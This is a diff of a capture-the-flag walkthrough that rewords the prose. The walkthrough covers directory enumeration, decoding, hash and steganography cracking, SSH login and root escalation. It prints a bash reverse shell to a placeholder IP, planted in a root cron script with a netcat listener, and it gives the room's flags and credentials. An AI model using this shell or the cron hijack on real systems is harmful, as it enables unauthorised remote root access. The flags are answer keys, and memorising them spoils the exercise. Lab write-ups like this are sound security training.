@@ -39,14 +39,14 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 2. What is the version of nginx?<br>
    `1.16.1`
 
-<i>To answer the last question we can also look at the output above.</i>
+<i>The output above also entails the answer to the last question.</i>
 
 3. What is running on the highest port?<br>
    `Apache`
 
 ## Task 2
 
-<i>We can use [gobuster](https://github.com/OJ/gobuster) to search for hidden directories. By using the `-u` flag we can specify a url to attack and as a wordlist we will use the [`common.txt`](https://gitlab.com/kalilinux/packages/dirb/-/blob/kali/master/wordlists/common.txt).<br>
+<i>We can use [gobuster](https://github.com/OJ/gobuster) to search for hidden directories. By using the `-u` flag we can specify a url to attack. As a wordlist we will use the [`common.txt`](https://gitlab.com/kalilinux/packages/dirb/-/blob/kali/master/wordlists/common.txt).<br>
 The command: `gobuster dir -u "http://MACHINE_IP" -w ./common.txt`</i>
 
 <pre>
@@ -55,7 +55,7 @@ The command: `gobuster dir -u "http://MACHINE_IP" -w ./common.txt`</i>
 /robots.txt (Status: 200)
 </pre>
 
-<i>When visiting the `/hidden` directory we just can see a picture and the source code also does not help us. But that can not be the end. Let's search further and make another gobuster search on the `/hidden` directory.<br>
+<i>When visiting the `/hidden` directory there is only a picture and the source code also does not help us. But that cannot be the end. Let's continue the search and perform another gobuster search on the `/hidden` directory.<br>
 The full command: `gobuster dir -u "http://MACHINE_IP/hidden" -w ./common.txt`</i>
 
 <pre>
@@ -63,14 +63,14 @@ The full command: `gobuster dir -u "http://MACHINE_IP/hidden" -w ./common.txt`</
 <b>/whatever</b> (Status: 301)
 </pre>
 
-<i>The `/whatever` directory looks interesting. By visiting the page we again just see a picture. But looking at the source code we can see a hidden p-tag with a `base64` looking string in it. Let's decode this string: `echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d`</i>
+<i>The `/whatever` directory looks interesting. By visiting the page there again is just a picture. But looking at the source code we can see a hidden p-tag with a `base64` looking string in it. Let's decode this string: `echo ZmxhZ3tmMXJzN19mbDRnfQ== | base64 -d`</i>
 
 1. What is flag 1?<br>
    `flag{f1rs7_fl4g}`
 
-<i>Now looking at the Apache server we can see the default page. We could make another gobuster scan to find maybe any interesting files or directories.<br>
+<i>Now looking at the Apache server we can see the default page. We could make another gobuster scan to find maybe some interesting files or directories.<br>
 The full command: `gobuster dir -u "http://MACHINE_IP:65524" -w ./common.txt`<br>
-Gobuster returns nothing really special but let's look at the `robots.txt`. At the User-Agent field is a string looking like a `MD5` hash or somehting like that.</i>
+Gobuster returns nothing really special but let's look at the `robots.txt`. At the User-Agent field there is a string, looking like a `MD5` hash or somehting like that.</i>
 
 <pre>
 /.hta (Status: 403)
@@ -81,26 +81,26 @@ Gobuster returns nothing really special but let's look at the `robots.txt`. At t
 /server-status (Status: 403)
 </pre>
 
-<i>To crack the hash I tried many websites but all of them haven't worked for me. Excepting one: [md5hashing.net](https://md5hashing.net). I slapped the hash in an waited. And the website returns me the second flag.</i>
+<i>To crack the hash I tried many websites but all of them haven't worked for me. Except one: [md5hashing.net](https://md5hashing.net). I inserted the hash, waiting. And the website returned me the second flag.</i>
 
 2. What is flag 2?<br>
    `flag{1m_s3c0nd_fl4g}`
 
-<i>Looking back to the Apache default page source code we can see the third flag standing there in clear. If you can not find the flag just search for it.</i>
+<i>Looking back to the Apache default page source code we can see the third flag in plain text. If you cannot find the flag at once, just keep searching.</i>
 
 3. What is flag 3?<br>
    `flag{9fdafbd64c47471a8f54cd3fc64cd312}`
 
-<i>The next question tells us to search for another hidden diretory. But not so fast. When I looked at the default page I also found another message: `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`. Should that mean that the string is base encoded? Let's try if we can decode it. A great website to test something like this is [CyberChef](https://gchq.github.io/CyberChef). I tried every `from base...` and got a hit with `base62`.</i>
+<i>The next question tells us to search for another hidden diretory. But not so fast. When I looked at the default page I also found another message: `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`. Should that mean that the string is `base` encoded? Let's try to decode it. A great website to test something like this is [CyberChef](https://gchq.github.io/CyberChef). I tried every `from base...` and got a hit with `base62`.</i>
 
 4. What is the hidden directory?<br>
    `/n0th1ng3ls3m4tt3r`
 
-<i>When visiting the hidden directory we can see another picture, another hash in the source code. The picture looks interesting because it is not stored on pixabay like the other pictures before. And it's name maybe should mislead us. Maybe there is a hidden file inside the picture. Let's download the picture by using `wget`.<br>
+<i>When visiting the hidden directory we can see another picture, another hash in the source code. The picture looks interesting because it is not stored on pixabay like the other pictures before. And its name maybe should mislead us. Maybe there is a hidden file inside the picture. Let's download the picture by using `wget`.<br>
 The command: `wget "http://MACHINE_IP:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg"`<br>
 Now we can try [steghide](http://steghide.sourceforge.net) on this picture. With `-sf` we can set a file to extract from.<br>
 The full command: `steghide extract -sf binarycodepixabay.jpg`<br>
-But it prompts us for a password but we don't have a password. But there was this hash on the page and the rooms provides a wordlist. After downloading the wordlist we can start up [stegcracker](https://github.com/Paradoxis/StegCracker) to crack password.<br>
+But it prompts for a password which we don't have. Remember, there was this hash on the page and the room provides a wordlist. After downloading the wordlist we can start up [stegcracker](https://github.com/Paradoxis/StegCracker) to crack the password.<br>
 The command: `stegcracker binarycodepixabay.jpg easypeasy.txt`</i>
 
 <pre>
@@ -126,12 +126,12 @@ password:
 01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
 </pre>
 
-<i>A username and a password encoded in binary...interesting. On [RapidTables](https://www.rapidtables.com/convert/number/binary-to-ascii.html) we can easily paste the binary in and convert it to text.</i>
+<i>A username and a password encoded in binary...interesting. On [RapidTables](https://www.rapidtables.com/convert/number/binary-to-ascii.html) we can easily paste the binary in and convert it to plain text.</i>
 
 6. What is the password to login to the machine via SSH?<br>
    `iconvertedmypasswordtobinary`
 
-<i>We have all credentials for a SSH login. After logging in we are in the home directory and can `cat` the `user.txt`.</i>
+<i>We have all credentials for an ssh login. After logging in we are in the home directory and can `cat` the `user.txt`.</i>
 
 <pre>
 User Flag But It Seems Wrong Like It`s Rotated Or Something
@@ -143,7 +143,7 @@ synt{a0jvgf33zfa0ez4y}
 7. What is the user flag?<br>
    `flag{n0wits33msn0rm4l}`
 
-<i>Now we have to become root to read the root flag. Looking at the cronjobs with `cat /etc/cronjobs` shows us that there is a cronjob running as root.</i>
+<i>Now we have to become root to read the root flag. Looking at the cronjobs with `cat /etc/cronjobs` shows a cronjob running as root.</i>
 
 <pre>
 17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
@@ -154,14 +154,14 @@ synt{a0jvgf33zfa0ez4y}
 <b>* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh</b>
 </pre>
 
-<i>When we look at the `.mysecretcronjob.sh` we have read and write permissions. That means we can execute commands as root. To get a reverse-shell we can copy one from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Now we have to `nano .mysecretcronjob.sh` and paste our reverse-shell in.</i>
+<i>When we look at the `.mysecretcronjob.sh` we have read and write permissions. That means we can execute commands as root. To get a reverse shell we can copy one from [pentestmonkey.net](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). Now we have to `nano .mysecretcronjob.sh` and paste in our reverse shell.</i>
 
 <pre>
 #!/bin/bash
-bash -i >& /dev/tcp/YOUR_INTERNAL_IP/8080 0>&1
+bash -i >& /dev/tcp/YOUR_IP/8080 0>&1
 </pre>
 
-<i>And we have to listen for a connection using `netcat -lnvp 8080`. It does not need much time and we get a connection and we became root. we can `cd` into the `/root` diretory and `ls -a` list all files. There is a `.root.txt` file. Because we are root we can simply type `cat .root.txt` and get the final root flag.</i>
+<i>And we have to listen for a connection using `netcat -lnvp 8080`. It does not need much time and we get a connection and become root. we can `cd` into the `/root` diretory and `ls -a` list all files. There is a `.root.txt` file. Because we are root we can simply type `cat .root.txt` and get the final root flag.</i>
 
 8. What is the root flag?<br>
    `flag{63a9f0ea7bb98050796b649e85481845}`
